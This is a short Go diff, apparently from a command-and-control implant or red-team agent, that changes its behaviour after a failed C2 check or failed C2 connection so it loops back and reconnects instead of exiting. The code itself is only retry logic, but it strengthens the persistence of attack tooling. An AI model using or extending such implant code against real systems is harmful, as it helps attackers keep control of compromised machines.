@@ -158,9 +158,10 @@ connect:
 	if common.RuntimeConfig.CCIndicatorWaitMax > 0 &&
 		common.RuntimeConfig.CCIndicatorURL != "" { // check indicator URL or not
 		if !c2transport.CheckC2Condition(common.RuntimeConfig.C2TransportProxy) {
-			logging.Println("Conditional C2 check failed, signaling parent and exiting")
+			logging.Println("Conditional C2 check failed, signaling parent and sleeping")
 			conditionalC2FailNotify()
-			return
+			// if we return from the above, it means we are resumed
+			goto connect
 		}
 	}
 
@@ -201,9 +202,9 @@ connect:
 	conn, ctx, cancel, err := c2transport.EstablishC2Connection(msgURL)
 	def.CCMsgConn = conn
 	if err != nil {
-		logging.Printf("Connection failed: %v, signaling parent and exiting", err)
+		logging.Printf("Connection failed: %v, signaling parent and sleeping", err)
 		conditionalC2FailNotify()
-		return
+		goto connect
 	}
 	def.KCPKeep = true
 	logging.Println("Connecting to message tunnel...")
